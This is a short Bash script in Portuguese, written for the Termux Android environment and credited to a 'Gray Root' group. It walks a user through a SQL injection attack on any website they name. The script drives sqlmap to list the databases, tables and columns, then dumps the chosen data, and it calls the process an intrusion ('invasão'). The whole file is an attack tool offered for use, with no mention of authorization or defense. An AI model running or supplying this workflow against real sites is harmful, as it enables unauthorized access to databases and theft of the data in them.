#!/bin/bash

#script desenvolvido por Linex Fundador da Gray root 

echo -e  "\033[01;31m+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\033[01;31m"
echo -e "\033[01;31m|  BEM VINDO AO SCRIPT DA GRAY ROOT SQL |\033[01;31m"
echo -e "\033[01;31m+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\033[01;31m"

cd /data/data/com.termux/files/home

echo -e "\033[01;33mInsira a Url do Site desejado:\033[01;33m"
read url
python2 sqlmap.py -u $url --dbs --random-agent
echo -e "\033[01;32m O sqlmap achou alguma database?:\033[01;32m"
read confi
if [ "$confi" == "sim" ]; then
	echo -e "\033[01;32m Ok Fazendo a injeção...\033[01;32m"
        echo
	sleep 4
	else
	echo -e "\033[01;31mInfelizmente a invasão não foi concluida\033[01;31m"
	exit
fi
echo -e "\033[01;32mQual a Database deseja escolher?\033[01;32m"
read database
python2 sqlmap.py -u $url -D $database --tables --random-agent
echo -e "\033[01;32mQual Tabela deseja escolher ?: \033[01;32m"
read table
python2 sqlmap.py -u $url -D $database -T $table --columns --random-agent
echo -e "\033[01;32mQual(is) Coluna(as) deseja escolher?:\033[01;32m"
read colum
python2 sqlmap.py -u $url -D $database -T $table -C $colum --dump --random-agent
echo -e "\033[01;36mInvasao finalizada !! Obrigado por utilizar este script \033[01;36m"
